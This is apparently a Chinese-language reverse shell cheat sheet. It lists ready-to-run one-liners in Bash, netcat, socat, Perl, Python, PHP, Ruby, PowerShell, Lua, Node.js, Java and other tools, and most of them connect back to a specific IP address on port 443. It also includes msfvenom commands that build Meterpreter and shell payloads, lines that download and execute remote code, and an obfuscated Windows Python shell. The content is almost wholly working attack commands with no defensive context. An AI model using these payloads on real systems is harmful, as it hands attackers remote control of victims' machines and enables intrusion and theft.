## 反弹shell

#### Bash TCP
	bash -i >& /dev/tcp/218.28.128.14/443 0>&1

	/bin/bash -i > /dev/tcp/218.28.128.14/443 0<& 2>&1

	exec 5<>/dev/tcp/218.28.128.14/443;cat <&5 | while read line; do $line 2>&5 >&5; done

	exec /bin/sh 0</dev/tcp/218.28.128.14/443 1>&0 2>&0

	0<&196;exec 196<>/dev/tcp/218.28.128.14/443; sh <&196 >&196 2>&196

#### Bash UDP
	sh -i >& /dev/udp/218.28.128.14/443 0>&1

	监听
	nc -u -lvp 443

#### Netcat

	不使用 -e
	mknod /tmp/backpipe p &&
	/bin/sh 0</tmp/backpipe | nc 12.25.204.49 446 1>/tmp/backpipe && echo $0

	nc -e /bin/sh 218.28.128.14 443

	nc -e /bin/bash 218.28.128.14 443

	nc -c bash 218.28.128.14 443

	mknod backpipe p && nc 218.28.128.14 443 0<backpipe | /bin/bash 1>backpipe 

	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 218.28.128.14 443 >/tmp/f

	rm -f /tmp/p; mknod /tmp/p p && nc 218.28.128.14 443 0/tmp/p 2>&1

	rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 218.28.128.14 443 > f

	rm -f x; mknod x p && nc 218.28.128.14 443 0<x | /bin/bash 1>x

#### Ncat
	ncat 218.28.128.14 443 -e /bin/bash

	ncat --udp 218.28.128.14 443 -e /bin/bash

#### Telnet
	rm -f /tmp/p; mknod /tmp/p p && telnet 218.28.128.14 443 0/tmp/p 2>&1

	telnet 218.28.128.14 443 | /bin/bash | telnet 218.28.128.14 444

	rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 218.28.128.14 443 > f

	rm -f x; mknod x p && telnet 218.28.128.14 443 0<x | /bin/bash 1>x

#### Socat

	/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:218.28.128.14:443

	socat tcp-connect:218.28.128.14:443 exec:"bash -li",pty,stderr,setsid,sigint,sane

	socat file:`tty`,raw,echo=0 TCP-L:443

	wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:218.28.128.14:443

#### Perl
	perl -e 'use Socket;$i="218.28.128.14";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

	perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"218.28.128.14:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

	Windows only, 
	perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"218.28.128.14:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

#### Python
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("218.28.128.14",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

	export RHOST="218.28.128.14";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("218.28.128.14",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 	
 	IP v6
	python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 	
 	Windows only:
	C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('218.28.128.14', 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"

#### PHP
	php -r '$sock=fsockopen("218.28.128.14",443);exec("/bin/sh -i <&3 >&3 2>&3");'

	php -r '$s=fsockopen("218.28.128.14",443);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'

	php -r '$s=fsockopen("218.28.128.14",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

	php -r '$s=fsockopen("218.28.128.14",443);`/bin/sh -i <&3 >&3 2>&3`;'

	php -r '$s=fsockopen("218.28.128.14",443);system("/bin/sh -i <&3 >&3 2>&3");'

	php -r '$s=fsockopen("218.28.128.14",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

	php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}'

#### Ruby
	ruby -rsocket -e'f=TCPSocket.open("218.28.128.14",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

	ruby -rsocket -e 'exit if fork;c=TCPSocket.new("218.28.128.14","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

	NOTE: Windows only
	ruby -rsocket -e 'c=TCPSocket.new("218.28.128.14","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#### OpenSSL
	攻击者
	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

	openssl s_server -quiet -key key.pem -cert cert.pem -port 443
	
	ncat --ssl -vv -l -p 443
 	
 	受害者
	mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 218.28.128.14:443 > /tmp/s; rm /tmp/s

#### Powershell
	powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("218.28.128.14",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

	powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('218.28.128.14',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

	powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')

#### Awk
	awk 'BEGIN {s = "/inet/tcp/0/218.28.128.14/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

#### TCLsh
	echo 'set s [socket 218.28.128.14 443];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh

#### Java
	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/218.28.128.14/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()

	String host="127.0.0.1";
	int port=4444;
	String cmd="cmd.exe";
	Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

	Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    	}
	}
	thread.start();

#### War
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=218.28.128.14 LPORT=443 -f war > reverse.war
	strings reverse.war | grep jsp # in order to get the name of the file

#### Lua
	Linux only
	lua -e "require('socket');require('os');t=socket.tcp();t:connect('218.28.128.14','443');os.execute('/bin/sh -i <&3 >&3 2>&3');"

	Windows and Linux
	lua5.1 -e 'local host, port = "218.28.128.14", 443 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

#### NodeJS:
	(function(){
    	var net = require("net"),
        	cp = require("child_process"),
        	sh = cp.spawn("/bin/sh", []);
    	var client = new net.Socket();
    	client.connect(443, "218.28.128.14", function(){
        	client.pipe(sh.stdin);
        	sh.stdout.pipe(client);
        	sh.stderr.pipe(client);
    	});
    	return /a/; // Prevents the Node.js application form crashing
	})();

	require('child_process').exec('nc -e /bin/sh 218.28.128.14 443')

	-var x = global.process.mainModule.require
	-x('child_process').exec('nc 218.28.128.14 443 -e /bin/bash')

	https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py

#### Groovy
	String host="218.28.128.14";
	int port=443;
	String cmd="cmd.exe";
	Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

#### Meterpreter Shell
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=218.28.128.14 LPORT=443 -f exe > reverse.exe

	msfvenom -p windows/shell_reverse_tcp LHOST=218.28.128.14 LPORT=443 -f exe > reverse.exe

	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=218.28.128.14 LPORT=443 -f elf >reverse.elf

	msfvenom -p linux/x86/shell_reverse_tcp LHOST=218.28.128.14 LPORT=443 -f elf >reverse.elf

	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="218.28.128.14" LPORT=443 -f elf > shell.elf

	msfvenom -p windows/meterpreter/reverse_tcp LHOST="218.28.128.14" LPORT=443 -f exe > shell.exe

	msfvenom -p osx/x86/shell_reverse_tcp LHOST="218.28.128.14" LPORT=443 -f macho > shell.macho

	msfvenom -p windows/meterpreter/reverse_tcp LHOST="218.28.128.14" LPORT=443 -f asp > shell.asp

	msfvenom -p java/jsp_shell_reverse_tcp LHOST="218.28.128.14" LPORT=443 -f raw > shell.jsp

	msfvenom -p java/jsp_shell_reverse_tcp LHOST="218.28.128.14" LPORT=443 -f war > shell.war

	msfvenom -p cmd/unix/reverse_python LHOST="218.28.128.14" LPORT=443 -f raw > shell.py

	msfvenom -p cmd/unix/reverse_bash LHOST="218.28.128.14" LPORT=443 -f raw > shell.sh

	msfvenom -p cmd/unix/reverse_perl LHOST="218.28.128.14" LPORT=443 -f raw > shell.pl

#### Xterm
	xterm -display 218.28.128.14:1
	Xnest :1
	xhost +targetip

	

#### ssh开启socks5
	ssh -N -f -D 0.0.0.0:1080 123.123.123.123 
